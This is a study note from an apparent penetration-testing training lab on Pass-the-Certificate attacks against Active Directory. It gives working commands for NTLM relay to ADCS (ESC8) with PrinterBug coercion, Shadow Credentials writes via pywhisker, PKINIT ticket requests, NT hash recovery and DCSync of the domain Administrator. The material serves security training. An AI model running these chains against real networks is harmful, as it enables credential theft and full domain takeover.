# NOTE — Pass the Certificate

## ID
529

## Module
Password Attacks

## Kind
methodology

## Title
Section 23 — Pass the Certificate

## Description
Obtain X.509 user certificates via ADCS abuses (ESC8 NTLM relay) or Shadow Credentials (msDS-KeyCredentialLink writes), then convert into Kerberos TGTs through PKINIT pre-auth. Includes coercion via PrinterBug.

## Tags
ptc, pkinit, adcs, esc8, shadow-credentials, ntlm-relay, pywhisker, pkinittools, gettgtpkinit, printerbug, dcsync

## Commands
- `sudo impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication`
- `python3 printerbug.py <domain>/<user>:<pass>@<dc> <attacker>`
- `pywhisker --dc-ip <dc> -d <domain> -u <wuser> -p <wpass> --target <victim> --action add`
- `python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass '<pwd>' -dc-ip <dc> <domain>/<user> /tmp/<user>.ccache`
- `export KRB5CCNAME=/tmp/<user>.ccache`
- `impacket-secretsdump -k -no-pass -dc-ip <dc> -just-dc-user Administrator '<domain>/DC01$'@DC01.<domain>`

## Concept Overview
PKINIT (Public Key Cryptography for Initial Authentication) is a Kerberos extension that lets clients authenticate with an X.509 certificate instead of a password. **Pass-the-Certificate (PtC)** = use a stolen/forged cert to mint a TGT via PKINIT pre-auth.

Three common paths to a usable certificate:
1. **ESC8** — relay NTLM auth to a Certificate Authority's Web Enrollment endpoint, issue a cert for the relaying user/computer.
2. **Shadow Credentials** — write your own public key into a victim's `msDS-KeyCredentialLink` AD attribute; the corresponding private key authenticates as that user via PKINIT.
3. **Compromised cert template** — various ESC1–ESC7 misconfigs (out of scope here; see the ADCS Attacks module).

## Path 1 — ESC8 (NTLM Relay → CA)

### Prerequisites
- A CA with **Web Enrollment** enabled (default `/certsrv/`)
- A victim whose NTLM auth you can capture/coerce
- SMB signing **not enforced** between victim and you

### Step 1 — Start ntlmrelayx
```bash
sudo impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp \
  --adcs -smb2support --template KerberosAuthentication
```
- `--adcs` — relay to ADCS Web Enrollment
- `--template` — cert template that supports authentication (`KerberosAuthentication`, `Machine`, `User`, …)

### Step 2 — Coerce auth (PrinterBug example)
Force the DC's machine account to authenticate to your relay:
```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'pw'@10.129.234.109 10.10.16.12
```
Other coercion tools: `PetitPotam`, `Coercer`, `dfscoerce`.

### Step 3 — Receive .pfx
ntlmrelayx writes the issued certificate to `./DC01$.pfx` (or whatever account was relayed).

## Path 2 — Shadow Credentials (msDS-KeyCredentialLink)

### Prerequisites
- The compromised user has *write* permission on the victim's `msDS-KeyCredentialLink` attribute (in BloodHound: **AddKeyCredentialLink** edge).
- The domain functional level is 2016+ (Win-Hello-for-Business cert binding required).

### Add Shadow Credentials with pywhisker
```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL \
  -u wwhite -p 'wwhite_password' \
  --target jpinkman --action add
```
Output gives you a `<random>.pfx` file and its password.

### Other actions
- `--action list` — show existing key creds (verify our add)
- `--action remove --device-id <guid>` — clean up after the op
- `--action clear` — wipe all of the victim's key creds (destructive!)

## Path 3 — Use the Cert (Common to Both Paths)

### Get a TGT via PKINIT
```bash
cd PKINITtools/
python3 gettgtpkinit.py -cert-pfx ../path/to/cert.pfx -pfx-pass '<password>' \
  -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```
This is now a regular `.ccache` Kerberos ticket — pass it just like in [[22-pass-the-ticket-from-linux]]:
```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

### Bonus — recover NT hash from the TGT
PKINIT's response contains a session key that, with the AS-REP encryption key, can reveal the user's NTLM hash:
```bash
python3 getnthash.py -key <AS-REP-key> INLANEFREIGHT.LOCAL/jpinkman
```
This converts a PtC primitive into a PtH/PtT primitive for free.

## DCSync from a Captured Machine TGT
After ESC8 against a DC, you have the DC's machine account ticket → DCSync the entire domain:
```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 \
  -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

## When PKINIT Isn't Allowed (no EKU)
Some certs can be obtained but lack the *Smart Card Logon* / *Client Authentication* EKU, so PKINIT pre-auth fails. **PassTheCert** can authenticate to LDAPS using just the cert, then perform AD changes (password reset, grant DCSync rights). See [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) — out of scope here.

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Contents of `flag.txt` on jpinkman's desktop | **(hidden — see HTB walkthrough)** | `pywhisker --target jpinkman --action add` → `gettgtpkinit.py` with the .pfx → `KRB5CCNAME=...ccache` → `evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local`, then read the file |
| Q2 — Contents of `flag.txt` on Administrator's desktop | **(hidden)** | `ntlmrelayx -t /certsrv/certfnsh.asp --adcs --template KerberosAuthentication`, coerce DC with `printerbug.py`, extract DC01$ PFX, `gettgtpkinit.py` → as DC01$ → `impacket-secretsdump -k` to retrieve Administrator NT hash, then `evil-winrm -u Administrator -H <hash>` and read |

## Key Takeaways
- ESC8 + PrinterBug + ntlmrelayx is the canonical "DC compromise via printer service" chain. Patches exist but environments lag.
- Shadow Credentials is permission-driven — BloodHound's **AddKeyCredentialLink** edge is the lead indicator.
- PKINIT-derived TGTs work in all standard ccache flows after `KRB5CCNAME=...` — no special tooling beyond what you already know from PtT.
- A DC's machine-account ticket lets you `DCSync`. Treat any ESC8-issued machine cert as game over.
- `getnthash.py` (in PKINITtools) extracts the NT hash from PKINIT, turning a PtC primitive into PtH/PtT.

## Gotchas
- Web Enrollment over plain HTTP is what makes ESC8 trivial. The HTTPS variant requires channel binding, which complicates relay.
- Coercion methods get patched continually. PrinterBug needs the Print Spooler service running on the target — disabled by default on modern DCs.
- Shadow Credentials require a cert template available to the *attacker* that supports auth — if templates are locked down to enrollment agents only, this may fail.
- `gettgtpkinit.py` and `oscrypto` have a dependency quirk: install via `pip3 install -I git+https://github.com/wbond/oscrypto.git` if you see "Error detecting the version of libcrypto".

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[22-pass-the-ticket-from-linux]] | [[24-password-policies]] →
<!-- AUTO-LINKS-END -->
